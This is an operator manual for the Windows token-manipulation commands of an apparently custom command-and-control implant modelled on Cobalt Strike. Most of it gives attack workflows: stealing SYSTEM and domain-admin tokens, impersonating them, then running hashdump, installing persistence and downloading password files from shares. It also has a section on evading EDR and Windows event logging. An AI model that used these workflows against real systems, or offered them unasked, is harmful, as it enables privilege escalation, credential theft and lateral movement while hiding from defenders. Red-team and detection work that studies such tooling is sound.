# Windows Token Manipulation

## Overview

The token manipulation feature provides comprehensive Windows access token operations for privilege escalation and lateral movement. This implementation allows operators to enumerate, steal, impersonate, and create access tokens similar to Cobalt Strike's token manipulation capabilities.

## What Are Access Tokens?

Windows access tokens are security objects that define the security context of a process or thread. They contain:
- **User SID**: Security identifier for the user account
- **Group memberships**: List of group SIDs the user belongs to
- **Privileges**: Special rights (SeDebugPrivilege, SeImpersonatePrivilege, etc.)
- **Integrity level**: Low, Medium, High, or System
- **Session ID**: Terminal session identifier
- **Token type**: Primary (process) or Impersonation (thread)

## How It Works

### Token Enumeration
The `token list` command:
1. Takes a snapshot of all running processes using `CreateToolhelp32Snapshot`
2. For each process, attempts to open it with `PROCESS_QUERY_INFORMATION`
3. Opens the process token with `OpenProcessToken`
4. Queries token information (user, domain, integrity level)
5. Returns formatted list of available tokens

### Token Theft
The `token steal` command:
1. Opens the target process with `PROCESS_QUERY_INFORMATION`
2. Opens the process token with `TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE`
3. Duplicates the token using `DuplicateTokenEx` with:
   - Access: `TOKEN_ALL_ACCESS`
   - Impersonation level: `SecurityImpersonation`
   - Token type: `TokenImpersonation`
4. Stores the duplicated token handle in the token manager
5. Returns a unique token ID for later use

### Token Impersonation
The `token impersonate` command:
1. Retrieves the stolen token from the token manager
2. Saves the current thread/process token (if not already saved)
3. Calls `ImpersonateLoggedOnUser` with the stolen token
4. All subsequent operations execute under the impersonated context

### Token Creation
The `token make` command:
1. Calls `LogonUserW` with:
   - Logon type: `LOGON32_LOGON_NEW_CREDENTIALS` (9)
   - Provider: `LOGON32_PROVIDER_DEFAULT` (0)
2. Creates a new token with the specified credentials
3. Automatically impersonates the new token
4. Stores the token for later management

**Note**: `LOGON32_LOGON_NEW_CREDENTIALS` creates a token for **network authentication only**. Local operations still use the original token, but network resources are accessed with the new credentials.

### Token Revert
The `token revert` command:
1. Calls `RevertToSelf` to stop impersonation
2. Restores the original execution context
3. Clears the current token reference

## Usage

### Entering Session Mode

First, enter an active session:

```bash
# From main console
use <session_id>

# Or use partial session ID
use cd334a25
```

### Basic Token Workflow

```bash
# 1. List available tokens
token list

# 2. Find a high-privilege token (look for SYSTEM, admin, or High integrity)
# Example output:
# Token ID        PID    Process         Username        Domain    Integrity
# token_1234      1234   explorer.exe    alice           CORP      High
# token_5678      5678   winlogon.exe    SYSTEM          NT AUTH   System

# 3. Steal the desired token
token steal 5678

# Output:
# {
#   "status": "success",
#   "token_id": "token_5678_0",
#   "pid": 5678,
#   "username": "SYSTEM",
#   "domain": "NT AUTHORITY",
#   "message": "Successfully stole token from PID 5678 (NT AUTHORITY\\SYSTEM)"
# }

# 4. Impersonate the stolen token
token impersonate token_5678_0

# Output:
# {
#   "status": "success",
#   "token_id": "token_5678_0",
#   "username": "SYSTEM",
#   "domain": "NT AUTHORITY",
#   "message": "Successfully impersonating NT AUTHORITY\\SYSTEM"
# }

# 5. Execute privileged commands
whoami
# Output: nt authority\system

# 6. When done, revert to original token
token revert

# Output:
# {
#   "status": "success",
#   "message": "Successfully reverted to original token"
# }
```

### Network Credential Token

```bash
# Create token with domain credentials
token make CORP administrator P@ssw0rd123

# Now network resources are accessed as CORP\administrator
# But local commands still run as original user

# Example: Access network share
shell net use \\fileserver\share

# Revert when done
token revert
```

## Command Reference

### token list

**Description**: Enumerate all available tokens from running processes

**Syntax**: `token list`

**Output**:
```json
{
  "status": "success",
  "count": 45,
  "tokens": [
    {
      "token_id": "token_1234",
      "pid": 1234,
      "process_name": "explorer.exe",
      "username": "alice",
      "domain": "CORP",
      "integrity_level": "High"
    },
    ...
  ]
}
```

**Privileges Required**: None (but limited tokens visible without elevated privileges)

**Windows Only**: Yes

---

### token steal

**Description**: Steal an access token from a target process

**Syntax**: `token steal <pid>`

**Arguments**:
- `<pid>`: Process ID to steal token from

**Example**:
```bash
token steal 1234
```

**Output**:
```json
{
  "status": "success",
  "token_id": "token_1234_0",
  "pid": 1234,
  "username": "admin",
  "domain": "CORP",
  "message": "Successfully stole token from PID 1234 (CORP\\admin)"
}
```

**Privileges Required**: `SeDebugPrivilege` (usually requires admin/SYSTEM)

**Windows Only**: Yes

---

### token impersonate

**Description**: Impersonate a previously stolen token

**Syntax**: `token impersonate <token_id>`

**Arguments**:
- `<token_id>`: Token ID returned from `token steal` or `token make`

**Example**:
```bash
token impersonate token_1234_0
```

**Output**:
```json
{
  "status": "success",
  "token_id": "token_1234_0",
  "username": "admin",
  "domain": "CORP",
  "message": "Successfully impersonating CORP\\admin"
}
```

**Privileges Required**: Token must have been successfully stolen first

**Persistence**: Impersonation persists until `token revert` or session ends

**Windows Only**: Yes

---

### token revert

**Description**: Revert to the original token

**Syntax**: `token revert`

**Example**:
```bash
token revert
```

**Output**:
```json
{
  "status": "success",
  "message": "Successfully reverted to original token"
}
```

**Windows Only**: Yes

---

### token make

**Description**: Create a new token with network credentials (similar to Cobalt Strike's make_token)

**Syntax**: `token make <domain> <username> <password>`

**Arguments**:
- `<domain>`: Domain name (use `.` for local account)
- `<username>`: Username
- `<password>`: Password

**Example**:
```bash
# Domain account
token make CORP administrator MyP@ssw0rd123

# Local account
token make . localadmin password123
```

**Output**:
```json
{
  "status": "success",
  "token_id": "made_token_0",
  "username": "administrator",
  "domain": "CORP",
  "message": "Successfully created and impersonating token for CORP\\administrator"
}
```

**Important Notes**:
- Uses `LOGON32_LOGON_NEW_CREDENTIALS` logon type
- Network operations use the new credentials
- Local operations still use the original token
- Does NOT verify credentials (will succeed even with wrong password, but network auth will fail)
- Credentials are stored in memory until revert

**Use Cases**:
- Access network shares with different credentials
- Authenticate to domain resources
- Pass-the-password attacks
- Lateral movement preparation

**Windows Only**: Yes

## Best Practices

### Choosing Tokens to Steal

**High-Value Targets**:
- `winlogon.exe` - Usually runs as SYSTEM
- `services.exe` - SYSTEM with many privileges
- `lsass.exe` - SYSTEM (but heavily monitored by EDR)
- `spoolsv.exe` - SYSTEM (Print Spooler service)
- Domain admin processes - Look for domain admin usernames

**Avoid**:
- `csrss.exe` - Critical system process
- `smss.exe` - Session Manager (can crash system)
- EDR/AV processes - Heavily monitored
- Protected Process Light (PPL) - Will fail with access denied

### Operational Workflow

1. **Reconnaissance**
   ```bash
   # List processes to find high-privilege targets
   ps

   # List available tokens
   token list
   ```

2. **Token Selection**
   - Look for SYSTEM integrity level
   - Check for domain admin accounts
   - Prefer long-running stable processes

3. **Privilege Escalation**
   ```bash
   # Steal and impersonate
   token steal <target_pid>
   token impersonate <token_id>

   # Verify escalation
   whoami
   ```

4. **Execute Objectives**
   ```bash
   # Perform privileged operations
   hashdump
   persist install
   # etc.
   ```

5. **Cleanup**
   ```bash
   # Revert to avoid suspicion
   token revert
   ```

### Network Credential Usage

```bash
# Scenario: Access file server with different credentials
token make CORP fileadmin P@ssw0rd123

# Access share
shell dir \\fileserver\admin$

# Copy files
download \\fileserver\admin$\secrets.txt /tmp/secrets.txt

# Revert when done
token revert
```

## Operational Security

### Detection Vectors

1. **Token Theft Detection**
   - EDR monitors `OpenProcessToken` on sensitive processes
   - `DuplicateTokenEx` calls are logged in Event ID 4688
   - Mitigation: Target less-monitored processes, limit frequency

2. **Impersonation Detection**
   - Event ID 4624 (Logon) with logon type 5 (Service)
   - Token impersonation can trigger behavioral alerts
   - Mitigation: Rotate tokens, match normal behavior patterns

3. **Credential Usage**
   - Failed authentication attempts logged (Event ID 4625)
   - Network authentication as different user may alert
   - Mitigation: Verify credentials before use, use sparingly

4. **Process Access**
   - Opening SYSTEM processes triggers alerts
   - Sysmon Event ID 10 (ProcessAccess)
   - Mitigation: Enable only when needed, use minimal permissions

### Evasion Techniques

1. **Target Selection**
   ```bash
   # Instead of obvious SYSTEM processes
   # Look for service processes
   token list | grep svchost

   # Target specific service instances
   token steal 2345  # svchost.exe with less monitoring
   ```

2. **Timing**
   - Don't steal tokens immediately after compromise
   - Wait for normal activity periods
   - Rotate tokens periodically

3. **Credential Validation**
   ```bash
   # Test credentials before using token make
   # Wrong credentials won't fail locally but will fail on network
   token make CORP test wrongpassword
   # Network access will fail but no local indication
   ```

## Troubleshooting

### Token Steal Failed: Access Denied

**Error**: `failed to open process token for PID 1234`

**Causes**:
- Insufficient privileges (need admin/SYSTEM)
- Target is Protected Process Light (PPL)
- Missing `SeDebugPrivilege`

**Solutions**:
```bash
# 1. Verify current privileges
whoami /priv

# 2. If running as admin, try enabling SeDebugPrivilege
# (Usually automatic in implant)

# 3. Try different target process
token list
token steal <different_pid>

# 4. Escalate privileges first
# Use other escalation techniques before token theft
```

### Token Impersonate Failed

**Error**: `failed to impersonate token token_1234_0`

**Causes**:
- Token ID doesn't exist (typo or expired)
- Token handle became invalid
- Insufficient privileges

**Solutions**:
```bash
# 1. List tokens again
token list

# 2. Re-steal the token
token steal 1234

# 3. Use the new token ID
token impersonate token_1234_1
```

### Token Make Not Working for Network Access

**Symptom**: `token make` succeeds but network access still fails

**Causes**:
- Wrong credentials (no error shown)
- Network not reachable from target
- Account locked/disabled
- Firewall blocking connection

**Solutions**:
```bash
# 1. Verify credentials are correct (test externally)

# 2. Test network connectivity
ping fileserver

# 3. Try different credentials
token revert
token make CORP different_user password

# 4. Verify account status
# Check domain controller for account issues
```

### Original Token Lost

**Symptom**: Can't revert to original token

**Cause**: Token manager lost original token reference

**Solution**:
```bash
# Revert will restore to process token
token revert

# If that fails, restart implant session
# Original token is the process token
```

## Advanced Usage

### Token Chaining

```bash
# 1. Start as low-priv user
whoami
# CORP\alice (Medium integrity)

# 2. Steal admin token
token steal 1234  # Local admin process
token impersonate token_1234_0

# 3. Use admin privileges to access SYSTEM token
token steal 5678  # SYSTEM process
token impersonate token_5678_0

# 4. Now running as SYSTEM
whoami
# nt authority\system
```

### Cross-Domain Access

```bash
# Scenario: Pivot from WORKSTATION domain to CORP domain
# Requires valid CORP credentials

# 1. Create CORP token
token make CORP domainuser P@ssw0rd123

# 2. Access CORP resources
shell dir \\corp-dc\sysvol

# 3. Enumerate CORP domain
shell net group "Domain Admins" /domain

# 4. Find CORP admin process (if logged in locally)
ps | grep CORP

# 5. Steal CORP admin token if available
token steal <corp_admin_pid>
token impersonate <token_id>
```

### Token Rotation

```bash
# Rotate tokens periodically to avoid detection
while true; do
  # Use token for a task
  token impersonate token_1234_0
  sleep 300  # 5 minutes

  # Revert
  token revert
  sleep 300  # 5 minutes

  # Use different token
  token impersonate token_5678_0
  sleep 300

  token revert
  sleep 300
done
```

## Technical Details

### Token Manager

The implant maintains a `TokenManager` structure:

```go
type TokenManager struct {
    mu             sync.Mutex
    stolenTokens   map[string]windows.Handle  // Map of token_id -> handle
    currentToken   windows.Handle             // Currently impersonated token
    originalToken  windows.Handle             // Original token for revert
    nextTokenID    int                        // Counter for unique IDs
}
```

### Token ID Format

- Stolen tokens: `token_<PID>_<counter>`
  - Example: `token_1234_0`
- Created tokens: `made_token_<counter>`
  - Example: `made_token_0`

### Windows API Calls

1. **Token Enumeration**:
   - `CreateToolhelp32Snapshot` - Process snapshot
   - `Process32First/Next` - Iterate processes
   - `OpenProcess` - Get process handle
   - `OpenProcessToken` - Get token handle
   - `GetTokenInformation` - Query token details
   - `LookupAccountSidW` - Resolve SID to username

2. **Token Theft**:
   - `OpenProcess(PROCESS_QUERY_INFORMATION)`
   - `OpenProcessToken(TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE)`
   - `DuplicateTokenEx(TOKEN_ALL_ACCESS, SecurityImpersonation, TokenImpersonation)`

3. **Token Impersonation**:
   - `OpenThreadToken` or `OpenProcessToken` - Save original
   - `ImpersonateLoggedOnUser` - Apply impersonation

4. **Token Creation**:
   - `LogonUserW(LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT)`
   - `ImpersonateLoggedOnUser` - Auto-impersonate

5. **Token Revert**:
   - `RevertToSelf` - Stop impersonation

### Integrity Levels

Tokens have integrity levels that affect access:

- **System** (0x4000+): SYSTEM account
- **High** (0x3000-0x3FFF): Administrators
- **Medium** (0x2000-0x2FFF): Standard users
- **Low** (0x1000-0x1FFF): Sandboxed processes
- **Untrusted** (0x0000-0x0FFF): Anonymous

Lower integrity processes cannot access higher integrity resources.

### Logon Types

`token make` uses `LOGON32_LOGON_NEW_CREDENTIALS` (type 9):
- Creates token for network authentication only
- Local operations use original token
- No validation of credentials at token creation
- Credentials used when accessing network resources

Other logon types (not used):
- Type 2: Interactive - Full user logon
- Type 3: Network - Remote access
- Type 4: Batch - Batch job
- Type 5: Service - Windows service

## Security Considerations

### Required Privileges

Most token operations require:
- **SeDebugPrivilege**: Access other processes' tokens
- **SeImpersonatePrivilege**: Impersonate tokens
- **Administrator rights**: Usually needed for the above

### Token Lifetime

- Stolen tokens remain valid until:
  - Source process exits
  - Token is closed
  - Session ends
  - System reboot

- Created tokens remain valid until:
  - Explicitly closed
  - Session ends
  - System reboot

### Persistence

Token impersonation is **per-thread**, not per-process:
- Only affects the implant's thread
- Survives across beacon intervals
- Lost if implant restarts
- Automatically revert on session end

## Testing Scenarios

### Scenario 1: Local Privilege Escalation

**Objective**: Escalate from standard user to SYSTEM

```bash
# 1. Check current privileges
whoami
# Output: CORP\alice

whoami /priv
# Output: No admin privileges

# 2. List available tokens
token list
# Look for SYSTEM tokens

# 3. Steal SYSTEM token
token steal 5678  # winlogon.exe

# 4. Impersonate
token impersonate token_5678_0

# 5. Verify
whoami
# Output: nt authority\system

# 6. Execute privileged action
hashdump

# 7. Revert
token revert
```

### Scenario 2: Network Resource Access

**Objective**: Access file share with different credentials

```bash
# 1. Check current access
shell dir \\fileserver\admin$
# Output: Access denied

# 2. Create token with file admin creds
token make CORP fileadmin FileP@ss123

# 3. Access share
shell dir \\fileserver\admin$
# Output: Success

# 4. Download sensitive file
download \\fileserver\admin$\passwords.txt /tmp/passwords.txt

# 5. Revert
token revert
```

### Scenario 3: Domain Admin Hunting

**Objective**: Find and steal domain admin token

```bash
# 1. List tokens looking for domain admins
token list
# Look for domain: CORP, username in "Domain Admins"

# 2. Verify domain admin
shell net group "Domain Admins" /domain
# Check if user is listed

# 3. Steal domain admin token
token steal 8888  # Process owned by DA

# 4. Impersonate
token impersonate token_8888_0

# 5. Verify domain admin privileges
whoami /groups
# Should show domain admin groups

# 6. Access domain controller
shell dir \\CORP-DC\C$
# Should succeed

# 7. Perform domain admin actions
# (hashdump DC, create persistence, etc.)
```

## Common Use Cases

### 1. Bypass UAC with Existing Admin Token

```bash
# If process running as admin but without elevation
token list
# Find same user but higher integrity

token steal <high_integrity_pid>
token impersonate <token_id>

# Now elevated
```

### 2. Pass-the-Hash Equivalent (with Password)

```bash
# Similar to PTH but with password
token make CORP admin KnownP@ssword123

# Access resources as that user
shell net use \\target\c$ /user:CORP\admin KnownP@ssword123
```

### 3. Service Account Abuse

```bash
# Find service running as powerful account
ps | grep -i sql

# Steal SQL Server service token (often high-priv)
token steal <sql_pid>
token impersonate <token_id>

# Execute with service account privileges
```

### 4. Pivot Between Accounts

```bash
# Switch between multiple stolen tokens
token impersonate token_1234_0  # User A
# Do stuff as User A
token revert

token impersonate token_5678_0  # User B
# Do stuff as User B
token revert
```

## References

- **Access Tokens**: https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens
- **Token Impersonation**: https://docs.microsoft.com/en-us/windows/win32/secauthz/client-impersonation
- **DuplicateTokenEx**: https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
- **LogonUser**: https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw
- **MITRE ATT&CK T1134**: Access Token Manipulation
- **Cobalt Strike**: Token Manipulation Documentation
- **Integrity Levels**: https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control

## Implementation Files

- **Implant**: `/home/kali/silkwire/implant/token_windows.go`
- **Console Commands**: `/home/kali/silkwire/console/commands.go` (lines 581-625)
- **Console CLI**: `/home/kali/silkwire/console/main.go` (lines 2256-2390)
- **Protobuf**: Token command types defined in proto files
